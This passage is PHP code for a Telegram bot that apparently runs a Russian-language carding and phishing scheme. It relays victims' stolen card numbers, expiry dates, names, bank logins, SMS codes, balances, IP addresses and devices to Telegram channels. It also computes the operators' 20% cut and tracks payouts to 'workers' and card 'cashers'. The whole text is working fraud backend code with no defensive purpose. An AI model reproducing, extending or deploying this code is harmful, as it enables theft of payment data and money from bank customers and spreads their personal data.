                    'text' => "❌ Лог бил @".$card->vblogin."⚠️\n\n ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n".($card->sms?"✉️ <b>SMS</b>: ".$card->sms." 👈":"")."\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n📬 <b>Статус вбива</b>: Вбив завершён\n📬 <b>Сумма успеха</b>: ".$summ_vbiv." грн\n\n "
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                $data = [
                    'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
                    'parse_mode'=>'HTML',
                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$summ_vbiv." UAH / ".curs($summ_vbiv,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n<b>ID</b>: ".$card->id."|\n"
                ];     
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
            //}
        }

        if($post->message->forward_from_chat&&$post->message->forward_from_chat->id==$bot_chanels->chanels->{'chanel_payments'}->id){
            preg_match_all('/ID\: (.*)\|/s', $post->message->text, $matches); 
            $card = $con->user->get_card($matches[1][0]);
            $product = (object)$con->products->get_product($card->pid); 
            $worker = (object)$con->user->get_user_byid($product->uid); 

            $btn1 = array("text" => "🗑 Удалить","callback_data" => "/deleteviplta_".$card->id);
            $btn2 = array("text" => "💸 Выплачено","callback_data" => "/successviplta_".$card->id);
            $inline_keyboard = [[$btn1,$btn2]]; 
                
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 

            $data = [
                'chat_id' => $card->vbid,  
                'parse_mode'=>'HTML',
                'text' => "💸 <b>Залет</b>: #".$card->id."\n <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n👨‍💻 <b>Воркер</b>: @".$worker->login."\n🦹‍♂️ <b>Вбивер</b>: @".$card->vblogin."\n"
            ];      
            $data['reply_markup']=$replyMarkup;
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        } 
        
    }



    /*~~ Update Chanels ~~*/
    if($post->channel_post){
         
         if (preg_match('/^[0-9.]+$/i', $post->channel_post->text)&&intval($post->channel_post->text)>0){
            $message_id = intval($post->channel_post->message_id);
            $card = (object)$con->user->get_card_ok(); 
            $product = (object)$con->products->get_product($card->pid);
            $worker = (object)$con->user->get_user_byid($product->uid); 

            //file_put_contents('./log.txt',json_encode($message_id)."\n\n");
            $summ_vbiv = $post->channel_post->text;
            $summ_vbiv_n = $summ_vbiv*20/100;
            $summ_vbiv = $summ_vbiv-$summ_vbiv_n;
            
            $con->user->update_card($card->id,array('vbiv_success_summ'=>$summ_vbiv,'vbiv_status'=>'success_ok')); 
            $banking = '';
            if($card->bank_login){
                $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
            }
            if($card->bank_haslo){
                $banking .= "\n💳 <b>Haslo</b>: ****";
            }
            if($card->bank_pin){
                $banking .= "\n💳 <b>Pin</b>: ****";
            }
            if($card->bank_pesel){
                $banking .= "\n💳 <b>Pesel</b>: ****";
            } 
            $data = [
                'chat_id' => $post->channel_post->chat->id, 
                'message_id'=>$card->message_id,
                'parse_mode'=>'HTML',
                'text' => "❌ Лог бил @".$card->vblogin."⚠️\n\n ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n📬 <b>Статус вбива</b>: Вбив завершён\n📬 <b>Сумма успеха</b>: ".$summ_vbiv." грн\n\n "
            ];  
            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            $data = [
                'chat_id' => $post->channel_post->chat->id, 
                'message_id'=>$message_id
            ];  

            file_get_contents($urlApi.$key.'/deleteMessage?'.http_build_query($data)); 

            $data = [
                'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
                'parse_mode'=>'HTML',
                'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n<b>ID</b>: ".$card->id."|\n"
            ];     
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }
         
        if(strpos($post->channel_post->text,'/chanel_')!==false){ 

            $channel_post_text = str_replace("/","",$post->channel_post->text);
            
                    $data = [
                        'chat_id' => $post->channel_post->chat->id,  
                        'parse_mode'=>'HTML',
                        'text' => "Успех! Радуйся!"
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
 
                    $me = file_get_contents($urlApi.$key.'/getMe');
                    $me = json_decode($me);
                    if($me->ok){
                        $data = [
                            'chat_id' => $post->channel_post->chat->id,
                            'user_id'=> $me->result->id
                        ];  
                        $chat_channel = file_get_contents($urlApi.$key.'/getChat?'.http_build_query($data));
                        $chat_channel = json_decode($chat_channel);
                        
                        if($chat_channel->ok){
                            $bot_chanels->chanels->{$channel_post_text} = 
                            array(
                                "id"=>$post->channel_post->chat->id, 
                                "type"=>$chat_channel->result->type, 
                                "title"=>$chat_channel->result->title, 
                                "invite_link"=>$chat_channel->result->invite_link
                            );

                            file_put_contents('./chanels.json',json_encode(array($bot_chanels)));
                        } 
                    }
        }
    } 
